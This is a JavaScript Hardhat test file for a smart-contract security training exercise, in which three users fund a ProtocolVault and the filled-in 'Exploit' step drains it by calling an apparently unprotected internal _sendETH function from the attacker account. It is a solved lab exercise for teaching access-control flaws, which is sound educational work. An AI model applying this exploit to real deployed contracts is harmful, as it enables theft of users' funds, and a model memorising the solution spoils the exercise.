const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Access Control Exercise 1', function () {

    let deployer, user1, user2, user3, attacker;
    const USER_DEPOSIT = ethers.utils.parseEther("10")

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user1, user2, user3, attacker] = await ethers.getSigners();

        this.attackerInitialETHBalance = await ethers.provider.getBalance(attacker.address);
        
        const ProtocolVaultFactory = await ethers.getContractFactory(
            'contracts/access-control-1/ProtocolVault.sol:ProtocolVault',
            deployer
        );
        this.protocolVault = await ProtocolVaultFactory.deploy();
        
        await user1.sendTransaction({
            to: this.protocolVault.address,
            value: USER_DEPOSIT
        });
        await user2.sendTransaction({
            to: this.protocolVault.address,
            value: USER_DEPOSIT
        });
        await user3.sendTransaction({
            to: this.protocolVault.address,
            value: USER_DEPOSIT
        });

        let currentBalance = await ethers.provider.getBalance(this.protocolVault.address);
        expect(currentBalance).to.be.equal(USER_DEPOSIT.mul(3));
        expect(this.protocolVault.connect(attacker).withdrawETH()).to.be.reverted;
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        await this.protocolVault.connect(attacker)._sendETH(attacker.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Protocol Vault is empty and attacker has ~30+ ETH
        expect(await ethers.provider.getBalance(this.protocolVault.address)).to.be.equal(0);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt((
            (this.attackerInitialETHBalance).add(USER_DEPOSIT.mul(3))).sub(ethers.utils.parseEther('0.2')
        ));
        
    });
});
